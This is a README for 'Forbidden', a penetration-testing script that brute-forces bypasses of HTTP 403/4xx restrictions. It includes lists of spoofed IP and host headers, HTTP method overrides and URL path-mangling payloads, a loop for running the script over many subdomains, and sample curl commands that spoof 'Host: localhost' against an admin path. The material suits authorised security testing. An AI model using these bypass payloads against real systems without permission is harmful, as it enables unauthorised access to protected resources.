# Forbidden

Bypass 4xx HTTP response status codes.

Script uses multithreading, and is based on brute forcing so might have some false positives. Script uses colored output.

Results will be sorted by HTTP response status code ascending, content length descending, and ID ascending.

Extend this script to your liking.

Tested on Kali Linux v2021.4 (64-bit).

Made for educational purposes. I hope it will help!

Tests:

* various HTTP methods,
* various HTTP methods with 'Content-Length: 0' header,
* cross-site tracing (XST) with HTTP TRACE and TRACK methods,
* file upload with HTTP PUT method,
* various HTTP method overrides,
* various HTTP headers,
* various URL overrides,
* URL override with two 'Host' headers,
* various URL path bypasses,
* basic authentication/authorization including null session,
* broken URL parser check.

Future plans:

* do not ignore URL parameters and fragments,
* add proxy as an option.

## Table of Contents

* [How to Run](#how-to-run)
* [HTTP Methods](#http-methods)
* [HTTP Headers](#http-headers)
* [URL Paths](#url-paths)
* [Results Format](#results-format)
* [Images](#images)

## How to Run

Open your preferred console from [/src/](https://github.com/ivan-sincek/forbidden/tree/main/src) and run the commands shown below.

Install required tools:

```fundamental
apt-get install -y curl
```

Install required packages:

```fundamental
pip3 install -r requirements.txt
```

Run the script:

```fundamental
python3 forbidden.py
```

Automate the script:

```fundamental
count=0; for subdomain in $(cat subdomains_403.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; python3 forbidden.py -u "${subdomain}" -t all -f GET -e path -o "forbidden_results_${count}.json"; done
```

Download a user agent list from [here](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/User-Agents/UserAgents.fuzz.txt).

# HTTP Methods

```fundamental
ACL
ARBITRARY
BASELINE-CONTROL
BIND
CHECKIN
CHECKOUT
CONNECT
COPY
DELETE
GET
HEAD
INDEX
LABEL
LINK
LOCK
MERGE
MKACTIVITY
MKCALENDAR
MKCOL
MKREDIRECTREF
MKWORKSPACE
MOVE
OPTIONS
ORDERPATCH
PATCH
POST
PRI
PROPFIND
PROPPATCH
PUT
REBIND
REPORT
SEARCH
SHOWMETHOD
SPACEJUMP
TEXTSEARCH
TRACE
TRACK
UNBIND
UNCHECKOUT
UNLINK
UNLOCK
UPDATE
UPDATEREDIRECTREF
VERSION-CONTROL
```

# HTTP Headers

```fundamental
Client-IP
Cluster-Client-IP
Connection
Contact
Forwarded
Forwarded-For
Forwarded-For-Ip
From
Host
Origin
Referer
Stuff
True-Client-IP
X-Client-IP
X-Custom-IP-Authorization
X-Forward
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Server
X-Forward-For
X-Forwared-Host
X-Host
X-HTTP-Host-Override
X-Original-URL
X-Originating-IP
X-Override-URL
X-ProxyUser-IP
X-Real-IP
X-Remote-Addr
X-Remote-IP
X-Rewrite-URL
X-Wap-Profile
X-Server-IP
X-Target
```

# URL Paths

Inject to front, back, and both front and back of URL path; with and without prepending and appending slashes.

```
/
//
%09
%20
%2e
.
..
;
.;
..;
;foo=bar;
~
~~
~~random
*
**
**random
#
##
##random
?
??
??random
.php
.jsp
.jspa
.jspx
.jhtml
.html
.sht
.shtml
.xhtml
.asp
.aspx
.esp
```

## Results Format

```json
[
	{
		"id": 9,
		"url": "https://example.com/admin",
		"method": "GET",
		"headers": [
			"Host: localhost"
		],
		"agent": null,
		"command": "curl -w '\n\nFBD-CL: %{size_download}' -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: localhost' -X 'GET' 'https://example.com/admin'",
		"code": 302,
		"length": 142
	},
	{
		"id": 49,
		"url": "https://example.com/admin",
		"method": "GET",
		"headers": [
			"Host: localhost:80"
		],
		"agent": null,
		"command": "curl -w '\n\nFBD-CL: %{size_download}' -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: localhost:80' -X 'GET' 'https://example.com/admin'",
		"code": 302,
		"length": 142
	},
	{
		"id": 169,
		"url": "https://example.com/admin",
		"method": "GET",
		"headers": [
			"Host: 127.0.0.1"
		],
		"agent": null,
		"command": "curl -w '\n\nFBD-CL: %{size_download}' -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: 127.0.0.1' -X 'GET' 'https://example.com/admin'",
		"code": 302,
		"length": 142
	},
	{
		"id": 209,
		"url": "https://example.com/admin",
		"method": "GET",
		"headers": [
			"Host: 127.0.0.1:80"
		],
		"agent": null,
		"command": "curl -w '\n\nFBD-CL: %{size_download}' -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: 127.0.0.1:80' -X 'GET' 'https://example.com/admin'",
		"code": 302,
		"length": 142
	}
]
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/forbidden/blob/main/img/help.png" alt="Help"></p>

<p align="center">Figure 1 - Help</p>
